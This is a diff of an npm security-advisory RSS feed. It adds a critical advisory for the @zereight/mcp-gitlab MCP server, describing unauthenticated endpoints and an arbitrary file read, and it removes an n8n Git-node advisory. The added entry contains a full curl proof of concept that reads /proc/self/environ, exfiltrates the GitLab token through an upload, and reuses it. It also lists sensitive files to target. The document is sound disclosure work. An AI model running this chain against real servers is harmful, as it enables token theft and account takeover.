@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-09-16T08:01:10.101Z</updated>
+    <updated>2026-09-16T13:50:16.751Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,141 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab: Unauthenticated arbitrary file read via `upload_markdown` enables PAT exfiltration and full account takeover]]></title>
+        <id>https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</id>
+        <link href="https://github.com/advisories/GHSA-cv3r-c5h8-f4g5"/>
+        <updated>2026-09-16T13:48:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The SSE transport mode (<code>SSE=true</code>) exposes all MCP tools without any authentication. The <code>upload_markdown</code> tool reads arbitrary files from the server's local filesystem via an unsanitized <code>file_path</code> parameter and uploads them to a GitLab project. Combined, any unauthenticated network-reachable attacker can read <code>/proc/self/environ</code> to steal the server's <code>GITLAB_PERSONAL_ACCESS_TOKEN</code> and achieve full GitLab account takeover. This is the default configuration for Docker deployments.</p>
+<h3 id="details">Details</h3>
+<p>Two issues chain together:</p>
+<p><strong>1. No authentication on SSE transport (<code>src/index.ts:7350-7388</code>)</strong></p>
+<p>When <code>SSE=true</code> (the intended mode for Docker deployments per <code>docker-compose.yaml</code>), the <code>/sse</code> and <code>/messages</code> endpoints have zero authentication middleware. Any HTTP client that can reach the port can establish a session and invoke all ~100+ tools using the server's configured PAT.</p>
+<pre><code class="language-typescript">// src/index.ts:7354 — no auth check
+app.get("/sse", async (_: Request, res: Response) =&gt; {
+    const serverInstance = createServer();
+    const transport = new SSEServerTransport("/messages", res);
+    await serverInstance.connect(transport);
+});
+</code></pre>
+<p>Remote Authorization (<code>REMOTE_AUTHORIZATION=true</code>) is explicitly incompatible with SSE mode (<code>src/index.ts:1833-1839</code>), so there is no way to add per-request auth in this transport.</p>
+<p><strong>2. Arbitrary file read in <code>upload_markdown</code> (<code>src/index.ts:5461-5503</code>)</strong></p>
+<p>The <code>upload_markdown</code> tool calls <code>fs.readFileSync(filePath)</code> where <code>filePath</code> comes directly from user input with no validation. The Zod schema (<code>src/schemas.ts:2150-2153</code>) defines <code>file_path</code> as <code>z.string()</code> with no path restrictions, allowlists, or sandboxing.</p>
+<pre><code class="language-typescript">async function markdownUpload(projectId: string, filePath: string) {
+    if (!fs.existsSync(filePath)) {
+        throw new Error(`File not found: ${filePath}`);
+    }
+    const fileBuffer = fs.readFileSync(filePath);  // Arbitrary file read — no path validation
+    // ... uploads to GitLab project via POST /projects/:id/uploads
+}
+</code></pre>
+<p>This tool is in the <code>users</code> toolset, which is <strong>enabled by default</strong>.</p>
+<p><strong>Docker amplification:</strong> The <code>Dockerfile</code> has no <code>USER</code> directive, so the process runs as root. The <code>docker-compose.yaml</code> maps <code>3002:3002</code>, which binds <code>0.0.0.0</code> by default, exposing the unauthenticated endpoint to the network.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>A running <code>@zereight/mcp-gitlab</code> instance with <code>SSE=true</code> and <code>GITLAB_PERSONAL_ACCESS_TOKEN</code> set (this is the default Docker deployment config)</li>
+<li>Network access to the server's port (default: 3002)</li>
+<li>A GitLab project ID the PAT has write access to (use <code>list_projects</code> to enumerate)</li>
+</ul>
+<p><strong>Steps:</strong></p>
+<pre><code class="language-bash"># 1. Connect to the unauthenticated SSE endpoint and capture the session ID
+SESSION_ID=$(curl -s -N http://&lt;HOST&gt;:3002/sse | head -1 | grep -oP 'sessionId=\K[^&amp;\s]+')
+
+# 2. (Optional) Enumerate accessible projects to find a writable project ID
+curl -X POST "http://&lt;HOST&gt;:3002/messages?sessionId=$SESSION_ID" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "list_projects",
+      "arguments": {"owned": true}
+    }
+  }'
+
+# 3. Read /proc/self/environ (contains GITLAB_PERSONAL_ACCESS_TOKEN in plaintext)
+#    and upload it to a GitLab project
+curl -X POST "http://&lt;HOST&gt;:3002/messages?sessionId=$SESSION_ID" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "jsonrpc": "2.0",
+    "id": 2,
+    "method": "tools/call",
+    "params": {
+      "name": "upload_markdown",
+      "arguments": {
+        "project_id": "&lt;WRITABLE_PROJECT_ID&gt;",
+        "file_path": "/proc/self/environ"
+      }
+    }
+  }'
+
+# 4. The response contains a GitLab upload URL like:
+#    {"markdown": "![environ](/uploads/abc123def456/environ)", "url": "/uploads/abc123def456/environ"}
+#
+# 5. Retrieve the uploaded file from GitLab:
+curl "https://gitlab.example.com/&lt;namespace&gt;/&lt;project&gt;/uploads/abc123def456/environ"
+
+# 6. The file contains NUL-separated environment variables including:
+#    GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxxxxxxxxxxxxxxxxx
+#
+# 7. Use the stolen PAT for full GitLab API access:
+curl -H "Private-Token: glpat-xxxxxxxxxxxxxxxxxxxx" "https://gitlab.example.com/api/v4/user"
+</code></pre>
+<p><strong>Other exfiltrable targets (running as root in Docker):</strong></p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/proc/self/environ</code></td>
+<td>All env vars including <code>GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxx</code></td>
+</tr>
+<tr>
+<td><code>/proc/self/cmdline</code></td>
+<td>Command line args (token if passed via CLI)</td>
+</tr>
+<tr>
+<td><code>/etc/shadow</code></td>
+<td>System password hashes</td>
+</tr>
+<tr>
+<td><code>/app/build/index.js</code></td>
+<td>Full application source code</td>
+</tr>
+<tr>
+<td><code>~/.gitlab-mcp-token.json</code></td>
+<td>OAuth tokens (if OAuth mode was used)</td>
+</tr>
+</tbody></table>
+<h3 id="impact">Impact</h3>
+<p><strong>Unauthenticated full GitLab account takeover.</strong> Any attacker with network access to the MCP server port can steal the Personal Access Token and gain complete access to the GitLab instance as the token owner - including all repositories, CI/CD secrets and variables, deploy keys, project settings, and admin functions if the user has admin privileges. No credentials or user interaction are required. This is the default configuration for Docker deployments</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61560">https://nvd.nist.gov/vuln/detail/CVE-2026-61560</a></li>
+<li><a href="https://github.com/zereight/gitlab-mcp/pull/482">https://github.com/zereight/gitlab-mcp/pull/482</a></li>
+<li><a href="https://github.com/zereight/gitlab-mcp/pull/554">https://github.com/zereight/gitlab-mcp/pull/554</a></li>
+<li><a href="https://github.com/zereight/gitlab-mcp/pull/622">https://github.com/zereight/gitlab-mcp/pull/622</a></li>
+<li><a href="https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976">https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976</a></li>
+<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27</a></li>
+<li><a href="https://github.com/advisories/GHSA-cv3r-c5h8-f4g5">https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-16T13:48:28.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab Vulnerable to Server-Side Request Forgery]]></title>
         <id>https://github.com/advisories/GHSA-2h44-8472-frjj</id>
@@ -2497,40 +2632,5 @@ container.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-09-10T21:18:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[n8n] n8n: Git Node branch.<name>.remote Config Key Bypasses Sandbox Path Restriction, Enabling Local Git Repository Read]]></title>
-        <id>https://github.com/advisories/GHSA-qgpw-8g46-w95v</id>
-        <link href="https://github.com/advisories/GHSA-qgpw-8g46-w95v"/>
-        <updated>2026-09-10T21:16:38.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>The Git node validated the repository that a fetch or pull targeted, but <code>setUpstream</code> wrote a <code>branch.&lt;name&gt;.remote</code> value into the repository's own configuration without validating it. A subsequent fetch or pull resolved the remote from that configuration rather than from the checked parameter, so an authenticated user with workflow-edit permission could point it at any local repository the n8n process could read and receive its contents. The patch validates the branch remote configuration on the same terms as the repository parameter.</p>
-<h2 id="patches">Patches</h2>
-<p>The issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
-<ul>
-<li>Restrict n8n instance access to fully trusted users only.</li>
-<li>Disable the Git node by adding <code>n8n-nodes-base.git</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
-<li>Ensure the n8n process runs under a dedicated low-privilege OS user account to limit the scope of any filesystem access.</li>
-</ul>
-<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-qgpw-8g46-w95v">https://github.com/n8n-io/n8n/security/advisories/GHSA-qgpw-8g46-w95v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-86995">https://nvd.nist.gov/vuln/detail/CVE-2026-86995</a></li>
-<li><a href="https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76">https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76</a></li>
-<li><a href="https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7">https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7</a></li>
-<li><a href="https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2">https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-qgpw-8g46-w95v">https://github.com/advisories/GHSA-qgpw-8g46-w95v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qgpw-8g46-w95v</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-10T21:16:36.000Z</published>
     </entry>
 </feed>
